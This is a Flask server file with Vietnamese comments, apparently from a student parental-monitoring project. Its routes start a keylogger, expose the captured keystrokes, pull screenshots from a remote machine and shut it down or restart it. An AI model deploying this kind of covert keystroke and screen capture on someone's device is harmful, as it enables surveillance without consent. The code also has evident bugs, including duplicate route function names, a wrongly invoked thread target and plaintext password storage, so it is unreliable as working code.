from flask import Flask, request, render_template
import sqlite3
import os
import threading
from server.parent import keyLogger_data
from server.parent import keyLogger
from server.receiveImageScreen import screenshots as parent_screenshots
from server.remoteControl import shutdown, restart


app = Flask(__name__)  # Specify the template folder explicitly

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['name']
        password = request.form['pass']

        # Kết nối đến cơ sở dữ liệu SQLite
        conn = sqlite3.connect('PBL.db')
        cursor = conn.cursor()

        # Thực hiện truy vấn SQL để kiểm tra tên người dùng và mật khẩu
        query = "SELECT * FROM user WHERE username = ? AND password = ?"
        try:
            # Thực hiện truy vấn SQL để kiểm tra tên người dùng và mật khẩu
            cursor.execute(query, (username, password))

            # Kiểm tra xem có người dùng hợp lệ trong cơ sở dữ liệu không
            user = cursor.fetchone()

            # Đóng kết nối đến cơ sở dữ liệu
            conn.close()

            if user:
                return render_template('index.html')
            else:
                return "Đăng nhập không thành công. Vui lòng kiểm tra lại tên người dùng và mật khẩu."
        
        except Exception as e:
            return "Đã xảy ra lỗi: " + str(e)

    return render_template('login.html')

# Route để trả về chuỗi dạng plain text
@app.route('/plain_text_data')
def get_plain_text_data():
    print(keyLogger_data)
    return keyLogger_data

@app.route('/keylogger')
def keyLogger_route():
    thread = threading.Thread(target=keyLogger()) 
    thread.daemon = True
    thread.start() 
    # global dataTest
    # dataTest = parent_keylogger()
    # return render_template('keylogger.html', dataTest=dataTest)  
   
    return render_template('keylogger.html')


@app.route('/screenshots')
def screenshots_route():
    global dataTest
    dataTest = parent_screenshots()
    return render_template('screenshots.html', dataTest=dataTest)


@app.route('/remote-control')
def remoteControl():
    # Xử lý logic cho chức năng "điều khiển" ở đây
    return render_template('remote-control.html') 
 
@app.route('/shutdown', methods=['POST'])
def shutdown():
    shutdown()
    
@app.route('/restart', methods=['POST'])
def shutdown():
    restart()

def restart():
    os.system('shutdown -r')
@app.route('/app-history')
def appHistory():
    # Xử lý logic cho chức năng "Giám sát bàn phím" ở đây
    return render_template('app-history.html')  


@app.route('/statistics')
def statistics():
    # Xử lý logic cho chức năng "Giám sát bàn phím" ở đây
    return render_template('statistics.html')  


if __name__ == '__main__':
    app.run(debug=True, port=8080)